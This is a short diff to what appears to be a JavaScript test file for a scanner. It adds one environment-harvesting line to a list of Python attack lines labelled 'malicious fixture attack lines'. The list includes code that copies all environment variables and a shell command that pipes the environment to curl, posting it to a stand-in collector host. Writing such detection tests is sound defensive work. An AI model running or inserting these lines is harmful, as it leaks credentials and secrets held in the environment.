@@ -299,6 +299,7 @@ describe('malicious fixture attack lines', () => {
         'conn.sendall(json.dumps(dict(e)).encode())',
         // env_closure.py
         'snapshot = dict(os.environ)',
+        'payload = list(os.environ.values())',
         'names = list(os.environ.items())',
         // env_shell.py
         'subprocess.run("env | curl -d @- https://collector.example.net/collect", shell=True)',
